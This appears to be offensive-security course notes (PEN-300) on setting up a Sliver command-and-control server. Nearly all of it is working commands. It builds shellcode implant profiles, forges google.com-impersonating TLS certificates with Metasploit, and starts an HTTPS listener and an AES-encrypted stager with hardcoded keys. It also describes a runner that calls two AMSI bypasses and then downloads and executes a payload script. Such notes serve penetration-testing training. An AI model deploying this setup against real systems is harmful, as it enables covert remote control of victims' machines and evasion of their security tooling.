# Overview

# Sliver Setup
## Create profile local64 and point to port 443
`sliver > profiles new --http 192.168.45.227:443 --format shellcode local64`

## Setup certs with metasploit
`msfconsole -q -x "use auxiliary/gather/impersonate_ssl; set RHOST www.google.com; run; exit"`
Then save the .crt and .key files into an appropriate folder for easy reference

## Setup main listener with google.crt / key generated with metasploit
`sliver > https -L 192.168.45.227 -l 443 -c /home/kali/Desktop/PEN-300/sliver/sslCerts/google.crt -k /home/kali/Desktop/PEN-300/sliver/sslCerts/google.key`

## Setup the main stager with unzip key / decryption keys 
`sliver > stage-listener --url https://192.168.45.227:8064 --profile local64 -c /home/kali/Desktop/PEN-300/sliver/sslCerts/google.crt -k /home/kali/Desktop/PEN-300/sliver/sslCerts/google.key -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV`

# Sliver Payload
The sliverloader.cs when compiled will generate a SliverLoader-x64.bin file which will require encoding into base 64

`PS C:\directory2sliver> get-content -encoding byte -path .\SliverLoader-x64.dll | clip`

use the simple powershellencoder.ps1 script to automate or simply paste into cyberchef 'To Base64' to encode, just need to modify the path 

`PS C:\directory2sliver> .\powershellEncoder.ps1`

## Add the encoded payload to a shellcode runner labeled sliver.txt (or .ps1 depending on need to obfuscate)
sliver.ps1 is the shellcode runner, should be used in conjunction with runner.ps1

## runner.ps1 or .txt is a quick and dirty multi script runner
The script runner will call 2 amsi bypasses, pass the current OS architecture and context user runner.txt is running in then finally pull and run the sliver.ps1. 